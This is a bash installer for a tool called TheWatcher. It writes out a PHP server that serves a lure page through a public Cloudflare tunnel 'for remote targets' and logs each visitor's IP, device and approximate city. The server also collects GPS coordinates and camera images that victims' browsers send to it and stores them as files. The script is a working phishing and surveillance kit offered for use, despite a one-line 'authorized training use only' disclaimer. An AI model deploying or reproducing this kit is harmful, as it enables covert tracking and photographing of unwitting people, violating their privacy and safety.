#!/usr/bin/env bash
# ============================================================
# TheWatcher v2.0 - Professional Universal Installer
# Author: EvilmaxSec
# Description: Auto-detects system (Termux/Linux/macOS/Windows)
#              and installs all dependencies automatically
# ============================================================

set -e  # Exit on error

# ==================== COLORS ====================
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
CYAN='\033[96m'
WHITE='\033[97m'
GRAY='\033[90m'
BOLD='\033[1m'
DIM='\033[2m'
END='\033[0m'

# ==================== GLOBALS ====================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INSTALL_DIR="$HOME/TheWatcher"
SYSTEM_TYPE="unknown"
ARCH="unknown"
PHP_INSTALLED=false
CLOUDFLARE_INSTALLED=false
PYTHON_CMD="python3"

# ==================== FUNCTIONS ====================

print_banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo '      ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  '
    echo '      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒'
    echo '      ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒'
    echo '      ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  '
    echo '        ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒'
    echo '        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░'
    echo '          ░     ▒ ░▒░ ░ ░ ░  ░     ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░'
    echo '        ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ '
    echo '                ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     '
    echo '                            ~EvilmaxSec | Tz~'
    echo -e "${END}"
    echo -e "${CYAN}${BOLD}"
    echo '╔═══════════════════════════════════════════════════════════════════════════╗'
    echo '║                    TheWatcher v2.0 - Professional Installer               ║'
    echo '║                      Auto-Detects & Installs Everything                   ║'
    echo '╚═══════════════════════════════════════════════════════════════════════════╝'
    echo -e "${END}"
    echo ""
}

print_success() { echo -e "  ${GREEN}✓${END} ${WHITE}$1${END}"; }
print_error() { echo -e "  ${RED}✗${END} ${WHITE}$1${END}"; }
print_info() { echo -e "  ${BLUE}ℹ${END} ${WHITE}$1${END}"; }
print_warning() { echo -e "  ${YELLOW}⚠${END} ${WHITE}$1${END}"; }
print_header() { echo -e "\n${CYAN}${BOLD}┌─────────────────────────────────────────────────────────────┐${END}"; echo -e "${CYAN}${BOLD}│  $1${END}"; echo -e "${CYAN}${BOLD}└─────────────────────────────────────────────────────────────┘${END}"; }

# Detect system type
detect_system() {
    print_info "Detecting system environment..."
    
    # Check for Termux
    if [[ -d "/data/data/com.termux/files/usr" ]]; then
        SYSTEM_TYPE="termux"
        PYTHON_CMD="python"
        print_success "Detected: Termux (Android)"
    # Check for Linux
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        if [[ -f "/etc/debian_version" ]]; then
            SYSTEM_TYPE="debian"
            print_success "Detected: Debian/Ubuntu Linux"
        elif [[ -f "/etc/redhat-release" ]]; then
            SYSTEM_TYPE="redhat"
            print_success "Detected: RedHat/CentOS Linux"
        elif [[ -f "/etc/arch-release" ]]; then
            SYSTEM_TYPE="arch"
            print_success "Detected: Arch Linux"
        elif [[ -f "/etc/kali-release" ]]; then
            SYSTEM_TYPE="kali"
            print_success "Detected: Kali Linux"
        else
            SYSTEM_TYPE="linux"
            print_success "Detected: Generic Linux"
        fi
    # Check for macOS
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        SYSTEM_TYPE="macos"
        print_success "Detected: macOS"
    # Check for Windows (WSL or Git Bash)
    elif [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "cygwin" ]] || [[ -n "$WSLENV" ]]; then
        SYSTEM_TYPE="windows"
        print_success "Detected: Windows (WSL/Git Bash)"
    else
        SYSTEM_TYPE="unknown"
        print_warning "Unknown system: $OSTYPE"
    fi
    
    # Detect architecture
    ARCH=$(uname -m)
    print_info "Architecture: $ARCH"
}

# Check and install PHP
install_php() {
    print_header "Installing PHP"
    
    case $SYSTEM_TYPE in
        termux)
            print_info "Installing PHP via pkg..."
            pkg update -y > /dev/null 2>&1
            pkg install php -y > /dev/null 2>&1
            ;;
        debian|kali)
            print_info "Installing PHP via apt..."
            sudo apt update -y > /dev/null 2>&1
            sudo apt install php -y > /dev/null 2>&1
            ;;
        redhat)
            print_info "Installing PHP via yum..."
            sudo yum install php -y > /dev/null 2>&1
            ;;
        arch)
            print_info "Installing PHP via pacman..."
            sudo pacman -S php --noconfirm > /dev/null 2>&1
            ;;
        macos)
            if command -v brew &> /dev/null; then
                print_info "Installing PHP via Homebrew..."
                brew install php > /dev/null 2>&1
            else
                print_warning "Homebrew not found. Please install PHP manually:"
                print_info "brew install php"
                return 1
            fi
            ;;
        windows)
            print_warning "Windows detected. Please install PHP manually:"
            print_info "Download from: https://windows.php.net/download/"
            return 1
            ;;
        *)
            print_warning "Automatic PHP installation not available"
            return 1
            ;;
    esac
    
    # Verify PHP installation
    if command -v php &> /dev/null; then
        PHP_VERSION=$(php -v | head -1 | cut -d' ' -f2)
        print_success "PHP $PHP_VERSION installed successfully"
        PHP_INSTALLED=true
        return 0
    else
        print_error "PHP installation failed"
        return 1
    fi
}

# Install Python dependencies
install_python_deps() {
    print_header "Installing Python Dependencies"
    
    # Check if python is available
    if ! command -v python3 &> /dev/null && ! command -v python &> /dev/null; then
        print_warning "Python not found. Installing Python..."
        case $SYSTEM_TYPE in
            termux)
                pkg install python -y > /dev/null 2>&1
                ;;
            debian|kali)
                sudo apt install python3 python3-pip -y > /dev/null 2>&1
                ;;
            *)
                print_warning "Please install Python manually"
                ;;
        esac
    fi
    
    # Install dependencies
    local deps=("requests" "pillow")
    for dep in "${deps[@]}"; do
        print_info "Installing $dep..."
        if pip install "$dep" > /dev/null 2>&1 || pip3 install "$dep" > /dev/null 2>&1; then
            print_success "$dep installed"
        else
            print_warning "Failed to install $dep"
        fi
    done
}

# Install Cloudflared (optional)
install_cloudflared() {
    print_header "Cloudflared (Optional - For Public URLs)"
    
    echo -e "  ${YELLOW}Cloudflared allows you to create public HTTPS URLs${END}"
    echo -e "  ${YELLOW}without port forwarding. Recommended for remote targets.${END}"
    echo ""
    read -p "$(echo -e "  ${YELLOW}?${END} ${WHITE}Install Cloudflared? (y/N): ${END}")" -n 1 -r
    echo ""
    
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Skipping Cloudflared installation"
        return 0
    fi
    
    case $SYSTEM_TYPE in
        termux)
            print_info "Downloading Cloudflared for Termux (ARM64)..."
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
            chmod +x cloudflared
            mv cloudflared $PREFIX/bin/
            ;;
        debian|kali|linux)
            if [[ "$ARCH" == "aarch64" ]] || [[ "$ARCH" == "arm64" ]]; then
                print_info "Downloading Cloudflared for ARM64..."
                wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
            elif [[ "$ARCH" == "armv7l" ]] || [[ "$ARCH" == "armhf" ]]; then
                print_info "Downloading Cloudflared for ARMv7..."
                wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
            else
                print_info "Downloading Cloudflared for AMD64..."
                wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
            fi
            chmod +x cloudflared
            sudo mv cloudflared /usr/local/bin/
            ;;
        macos)
            if command -v brew &> /dev/null; then
                brew install cloudflared > /dev/null 2>&1
            else
                print_warning "Please install cloudflared manually: brew install cloudflared"
                return 1
            fi
            ;;
        *)
            print_warning "Cloudflared installation not available for this system"
            return 1
            ;;
    esac
    
    if command -v cloudflared &> /dev/null; then
        print_success "Cloudflared installed successfully"
        CLOUDFLARE_INSTALLED=true
    else
        print_warning "Cloudflared installation failed"
    fi
}

# Create directory structure
create_directories() {
    print_header "Creating Directory Structure"
    
    cd "$INSTALL_DIR"
    
    local dirs=("data" "templates" "modules" "logs")
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir"
        print_success "Created: $dir/"
    done
    
    # Create .gitkeep files
    touch data/.gitkeep
    touch templates/.gitkeep
}

# Download TheWatcher files
download_files() {
    print_header "Downloading TheWatcher Files"
    
    cd "$INSTALL_DIR"
    
    # Create thewatcher.py
    print_info "Creating thewatcher.py..."
    
    # Download thewatcher.py from your GitHub
    if command -v wget &> /dev/null; then
        wget -q https://raw.githubusercontent.com/EvilmaxSec/TheWatcher/main/thewatcher.py -O thewatcher.py
    elif command -v curl &> /dev/null; then
        curl -s https://raw.githubusercontent.com/EvilmaxSec/TheWatcher/main/thewatcher.py -o thewatcher.py
    else
        print_error "wget or curl not found. Please install one of them."
        exit 1
    fi
    
    chmod +x thewatcher.py
    print_success "Created: thewatcher.py"
    
    # Create server.php
    print_info "Creating server.php..."
    cat > server.php << 'SERVERPHP_EOF'
<?php
// Create directories
if (!is_dir('data')) mkdir('data', 0755, true);
if (!is_dir('templates')) mkdir('templates', 0755, true);

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

$request_uri = strtok($_SERVER['REQUEST_URI'], '?');

function getClientIP() {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    if (strpos($ip, ',') !== false) $ip = explode(',', $ip)[0];
    return trim($ip);
}

function logToStderr($type, $data) {
    $timestamp = date('Y-m-d H:i:s');
    $output = "\n" . str_repeat("=", 70) . "\n";
    $output .= ($type == 'visit') ? "🔴 NEW VISITOR DETECTED!\n" : (($type == 'location') ? "📍 LOCATION CAPTURED!\n" : "📸 CAMERA IMAGE CAPTURED!\n");
    $output .= str_repeat("=", 70) . "\n";
    $output .= "  📅 Time: $timestamp\n";
    $output .= "  🌐 IP: {$data['ip']}\n";
    if ($type == 'location') $output .= "  📍 GPS: {$data['lat']}, {$data['lng']}\n";
    $output .= "  📱 Device: {$data['device']}\n";
    $output .= "  💻 OS: {$data['os']}\n";
    $output .= "  🌍 Browser: {$data['browser']}\n";
    if ($type != 'camera') $output .= "  🏙️ City: {$data['city']}\n";
    $output .= "  💾 Saved: {$data['file']}\n";
    $output .= str_repeat("=", 70) . "\n";
    file_put_contents('php://stderr', $output);
}

function parseUserAgent($ua) {
    $ua_lower = strtolower($ua);
    $os = 'Unknown';
    if (strpos($ua_lower, 'android') !== false) $os = 'Android';
    elseif (strpos($ua_lower, 'iphone') !== false) $os = 'iOS';
    elseif (strpos($ua_lower, 'windows') !== false) $os = 'Windows';
    elseif (strpos($ua_lower, 'mac') !== false) $os = 'macOS';
    elseif (strpos($ua_lower, 'linux') !== false) $os = 'Linux';
    
    $browser = 'Unknown';
    if (strpos($ua_lower, 'chrome') !== false && strpos($ua_lower, 'edg') === false) $browser = 'Chrome';
    elseif (strpos($ua_lower, 'firefox') !== false) $browser = 'Firefox';
    elseif (strpos($ua_lower, 'safari') !== false && strpos($ua_lower, 'chrome') === false) $browser = 'Safari';
    elseif (strpos($ua_lower, 'edg') !== false) $browser = 'Edge';
    
    $device = 'Desktop';
    if (strpos($ua_lower, 'mobile') !== false) $device = 'Mobile Phone';
    elseif (strpos($ua_lower, 'tablet') !== false) $device = 'Tablet';
    
    return ['os' => $os, 'browser' => $browser, 'device' => $device];
}

function getGeoFromIp($ip) {
    if ($ip == '127.0.0.1' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
        return ['country' => 'Local', 'city' => 'Local'];
    }
    $url = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($url);
    if ($response) {
        $data = json_decode($response, true);
        if ($data && $data['status'] == 'success') {
            return ['country' => $data['country'] ?? 'Unknown', 'city' => $data['city'] ?? 'Unknown'];
        }
    }
    return ['country' => 'Unknown', 'city' => 'Unknown'];
}

if ($request_uri == '/' && file_exists('templates/current.html')) {
    $ip = getClientIP();
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $device = parseUserAgent($ua);
    $geo = getGeoFromIp($ip);
    logToStderr('visit', [
        'ip' => $ip, 'device' => $device['device'], 'os' => $device['os'],
        'browser' => $device['browser'], 'city' => $geo['city'], 'country' => $geo['country'],
        'file' => 'N/A'
    ]);
    header('Content-Type: text/html');
    readfile('templates/current.html');
    exit();
}

if ($request_uri == '/location' && $_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    if ($data) {
        $ip = getClientIP();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $device = parseUserAgent($ua);
        $geo = getGeoFromIp($ip);
        $filename = 'data/location_' . time() . '.json';
        file_put_contents($filename, json_encode([
            'timestamp' => date('Y-m-d H:i:s'), 'ip_address' => $ip,
            'coordinates' => ['latitude' => $data['lat'], 'longitude' => $data['lng'], 'accuracy' => $data['acc']],
            'device' => $device, 'network' => $geo
        ], JSON_PRETTY_PRINT));
        logToStderr('location', [
            'ip' => $ip, 'lat' => $data['lat'], 'lng' => $data['lng'], 'device' => $device['device'],
            'os' => $device['os'], 'browser' => $device['browser'], 'city' => $geo['city'],
            'country' => $geo['country'], 'file' => $filename
        ]);
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok']);
        exit();
    }
}

if ($request_uri == '/camera' && $_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['image'])) {
        $filename = 'data/camera_' . time() . '.jpg';
        move_uploaded_file($_FILES['image']['tmp_name'], $filename);
        $ip = getClientIP();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $device = parseUserAgent($ua);
        $geo = getGeoFromIp($ip);
        logToStderr('camera', [
            'ip' => $ip, 'device' => $device['device'], 'os' => $device['os'],
            'browser' => $device['browser'], 'city' => $geo['city'],
            'country' => $geo['country'], 'file' => $filename
        ]);
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok']);
        exit();
    }
}

if (file_exists('templates/current.html')) {
    readfile('templates/current.html');
} else {
    echo "TheWatcher Ready";
}
?>
SERVERPHP_EOF

    print_success "Created: server.php"
    
    # Create modules files
    mkdir -p modules
    
    cat > modules/__init__.py << 'INIT_EOF'
from .cloudflare import CloudflareTunnel
from .templates import TemplateManager
INIT_EOF
    
    cat > modules/cloudflare.py << 'CF_EOF'
import subprocess, re, os, time

class CloudflareTunnel:
    def __init__(self):
        self.process = None
        self.url = None
        self.logfile = None
    
    def start(self, port):
        self.logfile = f"/tmp/cf_{port}.log"
        if not self._check_cloudflared():
            return None
        cmd = f"cloudflared tunnel --url http://127.0.0.1:{port} --logfile {self.logfile}"
        self.process = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(30):
            time.sleep(1)
            if os.path.exists(self.logfile):
                with open(self.logfile, 'r') as f:
                    match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', f.read())
                    if match:
                        self.url = match.group(0)
                        return self.url
        return None
    
    def stop(self):
        if self.process:
            self.process.terminate()
        if self.logfile and os.path.exists(self.logfile):
            os.remove(self.logfile)
    
    def _check_cloudflared(self):
        try:
            subprocess.run(["cloudflared", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except FileNotFoundError:
            return False
CF_EOF

    # Download templates.py from GitHub
    print_info "Downloading templates.py..."
    if command -v wget &> /dev/null; then
        wget -q https://raw.githubusercontent.com/EvilmaxSec/TheWatcher/main/modules/templates.py -O modules/templates.py
    elif command -v curl &> /dev/null; then
        curl -s https://raw.githubusercontent.com/EvilmaxSec/TheWatcher/main/modules/templates.py -o modules/templates.py
    fi
    print_success "Created: modules/templates.py"
    
    # Create requirements.txt
    cat > requirements.txt << 'REQ_EOF'
requests==2.31.0
pillow==10.0.0
REQ_EOF
    print_success "Created: requirements.txt"
    
    # Create start script
    cat > start.sh << 'STARTSCRIPT_EOF'
#!/bin/bash
cd "$(dirname "$0")"
echo -e "\033[96m🚀 Starting TheWatcher...\033[0m"
python3 thewatcher.py
STARTSCRIPT_EOF
    chmod +x start.sh
    print_success "Created: start.sh"
}

# Main installation
main() {
    print_banner
    detect_system
    print_header "Setting Up Installation Directory"
    mkdir -p "$INSTALL_DIR"
    cd "$INSTALL_DIR"
    print_success "Installation directory: $INSTALL_DIR"
    
    install_python_deps
    install_php
    install_cloudflared
    create_directories
    download_files
    
    clear
    echo -e "${GREEN}${BOLD}"
    echo '╔═══════════════════════════════════════════════════════════════════════════╗'
    echo '║                         ✅ INSTALLATION COMPLETE!                          ║'
    echo '╚═══════════════════════════════════════════════════════════════════════════╝'
    echo -e "${END}"
    echo ""
    echo -e "${CYAN}🚀 How to start:${END}"
    echo -e "  ${YELLOW}cd $INSTALL_DIR && ./start.sh${END}"
    echo -e "  ${YELLOW}OR${END}"
    echo -e "  ${YELLOW}cd $INSTALL_DIR && python3 thewatcher.py${END}"
    echo ""
    echo -e "${RED}${BOLD}⚠️  For authorized training use only!${END}\n"
}

# Run main
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    trap 'echo -e "\n${RED}❌ Installation interrupted${END}"; exit 1' INT
    main "$@"
fi
